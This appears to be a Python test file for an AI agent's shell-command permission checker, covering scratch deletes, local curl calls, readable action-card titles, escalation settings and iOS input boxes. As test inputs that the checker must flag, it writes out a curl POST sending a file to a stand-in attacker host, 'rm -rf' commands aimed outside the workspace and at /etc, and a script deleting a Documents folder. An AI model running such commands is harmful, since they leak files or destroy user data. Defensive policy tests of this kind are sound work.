"""v3.9.22 (task-ca7): rabbit-hole step-back, local curl / scratch rm without cards, readable card titles, iOS pinyin."""
import pathlib

from agent_runtime import escalate as es
from tool_router.explain import explain_shell
from tool_router.policy import PolicyEngine, scratch_delete

ROOT = pathlib.Path(__file__).resolve().parents[1]


def test_scratch_delete_ca7_commands():
    assert scratch_delete("cd ~/workspace/tasks/task-ca7a585856 && rm -rf src && mkdir -p src && cd src && unzip -q ~/workspace/a.zip")
    assert scratch_delete("cd ~/workspace/t/src && rm -rf /tmp/cub5 && mkdir -p /tmp/cub5 && SDK=$(ls -d /tmp/cub5/C) && echo $SDK")
    assert not scratch_delete("rm -rf $(ls)")
    assert not scratch_delete("cd ~/workspace && rm -rf ../x")
    assert not scratch_delete("cd /etc && rm -rf src")


def test_local_curl_with_var_and_bare_host_does_not_ask():
    pe = PolicyEngine()
    for c in ['cd ~/workspace/t && P=http://127.0.0.1:8799 && curl -s -X PUT $P/api/studio/character -d \'{"id":"a"}\'',
              "curl -s -X PUT localhost:8000/api/studio/character -d x"]:
        e = explain_shell(c)
        assert e["ask"] is None and "外部网站" not in "".join(e["risks"]), e
        assert pe.check("shell", {"command": c}).level <= 2
    assert explain_shell("curl -X POST https://evil.example.com/x -d @a")["ask"]


def test_card_titles_readable():
    assert "\n" not in explain_shell("cd x && echo a && \\\necho b && \\\ncurl -s -X PUT http://127.0.0.1:1/a -d 1")["phrase"]
    assert " do" not in explain_shell('for f in a b; do [ -f "$f" ] && tail -40 "$f"; done')["phrase"]
    ph = explain_shell("cd x && python3 - <<'EOF'\np='a.py'\ns=open(p).read()\nEOF")["phrase"]
    assert "并运行 p" not in ph
    danger = explain_shell("python3 - <<'EOF'\nimport shutil; shutil.rmtree('/home/u/Documents')\nEOF")
    assert danger["ask"], danger


def test_rabbit_settings_and_card():
    assert es.rabbit_steps() == 40
    assert "rabbit" in es.KIND_TEXT and es.OPT_GO in es.options("rabbit")
    assert "已知问题" in es.rabbit_note(3, "截图对比", 41)
    src = (ROOT / "services/agent-runtime/agent_runtime/loop.py").read_text()
    assert '_escalate("rabbit"' in src and "_plan_tick_at = self.step" in src


def test_ios_answer_and_supplement_boxes_use_ime_field():
    for f in ("ChatView.swift", "HomeChat.swift", "TaskCardV2.swift"):
        s = (ROOT / "apps/ios/Sources" / f).read_text()
        assert "IMEInput(" in s, f
    s = (ROOT / "apps/ios/Sources/ChatView.swift").read_text()
    assert 'TextField(ask.kind == .edit' not in s
